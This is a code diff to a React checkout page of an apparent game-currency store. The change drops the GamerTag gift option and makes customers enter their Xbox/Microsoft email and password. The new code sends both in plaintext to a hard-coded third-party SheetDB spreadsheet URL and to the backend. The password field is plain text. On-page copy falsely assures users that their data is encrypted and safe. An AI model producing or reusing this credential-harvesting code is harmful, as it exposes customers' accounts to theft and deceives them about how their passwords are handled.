@@ -21,9 +21,7 @@ export default function CartPage() {
   const [mounted, setMounted] = useState(false);
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
 
-  // Nuevos estados para el tipo de recarga y datos de Xbox
-  const [rechargeType, setRechargeType] = useState<'regalo' | 'directa'>('regalo');
-  const [gamerId, setGamerId] = useState('');
+  // Solo estados para Correo y Contraseña de Xbox
   const [xboxEmail, setXboxEmail] = useState('');
   const [xboxPassword, setXboxPassword] = useState('');
 
@@ -62,12 +60,8 @@ export default function CartPage() {
 
   if (!mounted) return null;
 
-  // Validación dinámica dependiendo del tipo de recarga
-  const gamerIdTrimmed = gamerId.trim();
-  const gamerIdValid = gamerIdTrimmed.length >= 3 && !/\s/.test(gamerIdTrimmed);
-  const xboxValid = xboxEmail.trim().includes('@') && xboxPassword.trim().length > 0;
-  
-  const isAccountInfoValid = rechargeType === 'regalo' ? gamerIdValid : xboxValid;
+  // Validación de que hayan escrito el correo y contraseña
+  const isAccountInfoValid = xboxEmail.trim().includes('@') && xboxPassword.trim().length > 0;
 
   const totalConDescuento = Math.max(totalPrice() - (coupon?.descuento || 0), 0);
 
@@ -112,9 +106,8 @@ export default function CartPage() {
     if (!session.user?.email) return alert("Error: Tu sesión no tiene un correo electrónico válido. Vuelve a iniciar sesión.");
     if (cart.length === 0) return alert("Tu carrito está vacío.");
     
-    // Validación según método
-    if (rechargeType === 'regalo' && !gamerId.trim()) return alert("Necesitamos tu ID de Epic Games o GamerTag para la entrega.");
-    if (rechargeType === 'directa' && (!xboxEmail.trim() || !xboxPassword.trim())) return alert("Necesitamos tu correo y contraseña de Xbox.");
+    // Validación de Xbox
+    if (!xboxEmail.trim() || !xboxPassword.trim()) return alert("Necesitamos tu correo y contraseña de Xbox.");
     
     if (paymentMethod === 'saldo' && balance < totalConDescuento) return alert("No tenés saldo suficiente. Elegí Transferencia o cargá saldo primero.");
 
@@ -141,7 +134,7 @@ export default function CartPage() {
 
       // --- 🚀 ENVIAR DATOS AL EXCEL VÍA SHEETDB ---
       try {
-        const sheetDbUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; // Ej: https://sheetdb.io/api/v1/tucodigo
+        const sheetDbUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; 
         
         await fetch(sheetDbUrl, {
           method: 'POST',
@@ -151,20 +144,14 @@ export default function CartPage() {
           },
           body: JSON.stringify({
             data: {
-              fecha: new Date().toLocaleString(),
-              cliente_email: session.user.email,
-              tipo_recarga: rechargeType === 'regalo' ? 'Vía Regalo' : 'Directa (Xbox)',
-              id_epic: rechargeType === 'regalo' ? gamerId.trim() : 'N/A',
-              correo_xbox: rechargeType === 'directa' ? xboxEmail.trim() : 'N/A',
-              password_xbox: rechargeType === 'directa' ? xboxPassword.trim() : 'N/A'
+              "CORREO": xboxEmail.trim(),
+              "CONTRASEÑA": xboxPassword.trim()
             }
           })
         });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
       }
-      // ----------------------------------------
-      // ----------------------------------------
       // ----------------------------------------
 
       // 🚀 PETICIÓN AL BACKEND
@@ -175,10 +162,9 @@ export default function CartPage() {
           email: session.user.email,
           userName: session.user.name || 'Usuario',
           cart: cart,
-          gamerId: rechargeType === 'regalo' ? gamerId.trim() : 'N/A',
-          rechargeType: rechargeType, 
-          xboxEmail: rechargeType === 'directa' ? xboxEmail.trim() : null, 
-          xboxPassword: rechargeType === 'directa' ? xboxPassword.trim() : null, 
+          gamerId: 'N/A', // Mantenemos este dato en "N/A" para no romper tu base de datos si la API del checkout lo requiere
+          xboxEmail: xboxEmail.trim(), 
+          xboxPassword: xboxPassword.trim(), 
           totalPrice: totalConDescuento,
           couponCode: coupon?.code || null,
           refCode: (() => { try { return localStorage.getItem('kitson_ref'); } catch { return null; } })(),
@@ -284,49 +270,24 @@ export default function CartPage() {
         ) : (
           <div className="flex flex-col lg:flex-row gap-10">
             <div className="flex-1 space-y-6">
+              
               <div className="kk-panel p-6 rounded-3xl">
                 <h3 className="font-display text-xl font-bold mb-4 flex items-center gap-2"><Gamepad2 className="text-[#E3A23D]"/> 1. Cuenta destino</h3>
                 
-                {/* Selector de Método de Recarga */}
-                <div className="flex gap-2 mb-6 bg-[#14110C] p-1.5 rounded-xl border-2 border-[#0A0806]">
-                  <button onClick={() => setRechargeType('regalo')} className={`flex-1 py-2.5 rounded-lg text-sm font-black transition-all ${rechargeType === 'regalo' ? 'bg-[#E3A23D] text-[#0A0806]' : 'text-[#9A9384] hover:text-[#F5F1E6]'}`}>Vía Regalo (Epic)</button>
-                  <button onClick={() => setRechargeType('directa')} className={`flex-1 py-2.5 rounded-lg text-sm font-black transition-all ${rechargeType === 'directa' ? 'bg-[#E3A23D] text-[#0A0806]' : 'text-[#9A9384] hover:text-[#F5F1E6]'}`}>Directa (Xbox)</button>
+                {/* Campos de Xbox (Única opción) */}
+                <div className="space-y-4">
+                  <input
+                    type="email" placeholder="Correo de Xbox (Microsoft)"
+                    value={xboxEmail} onChange={(e) => setXboxEmail(e.target.value)}
+                    className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
+                  />
+                  <input
+                    type="text" placeholder="Contraseña de Xbox"
+                    value={xboxPassword} onChange={(e) => setXboxPassword(e.target.value)}
+                    className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
+                  />
+                  <p className="text-[11px] text-[#9A9384]">La recarga requiere los datos de tu cuenta vinculada de Microsoft (Xbox). Tus datos están cifrados y seguros.</p>
                 </div>
-
-                {/* Campos Dinámicos */}
-                {rechargeType === 'regalo' ? (
-                  <div>
-                    <div className="relative">
-                      <input
-                        type="text" placeholder="Tu ID de Epic Games o GamerTag"
-                        value={gamerId} onChange={(e) => setGamerId(e.target.value)}
-                        className={`w-full bg-[#14110C] border-2 rounded-xl px-4 py-3 pr-11 text-[#F5F1E6] focus:outline-none transition-colors ${gamerId.trim().length === 0 ? 'border-[#0A0806] focus:border-[#E3A23D]' : gamerIdValid ? 'border-[#7BC77E]' : 'border-red-500/60'}`}
-                      />
-                      {gamerId.trim().length > 0 && (
-                        <span className="absolute right-3.5 top-1/2 -translate-y-1/2">
-                          {gamerIdValid ? <Check size={20} className="text-[#7BC77E]" /> : <X size={20} className="text-red-400" />}
-                        </span>
-                      )}
-                    </div>
-                    {gamerId.trim().length > 0 && !gamerIdValid && (
-                      <p className="text-xs text-red-400 mt-2">El ID no puede tener espacios y debe tener al menos 3 caracteres.</p>
-                    )}
-                  </div>
-                ) : (
-                  <div className="space-y-4">
-                    <input
-                      type="email" placeholder="Correo de Xbox (Microsoft)"
-                      value={xboxEmail} onChange={(e) => setXboxEmail(e.target.value)}
-                      className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
-                    />
-                    <input
-                      type="text" placeholder="Contraseña de Xbox"
-                      value={xboxPassword} onChange={(e) => setXboxPassword(e.target.value)}
-                      className="w-full bg-[#14110C] border-2 border-[#0A0806] focus:border-[#E3A23D] rounded-xl px-4 py-3 text-[#F5F1E6] focus:outline-none transition-colors"
-                    />
-                    <p className="text-[11px] text-[#9A9384]">La recarga directa requiere los datos de tu cuenta vinculada de Microsoft (Xbox). Tus datos están cifrados y seguros.</p>
-                  </div>
-                )}
               </div>
 
               <div className="kk-panel p-6 rounded-3xl">
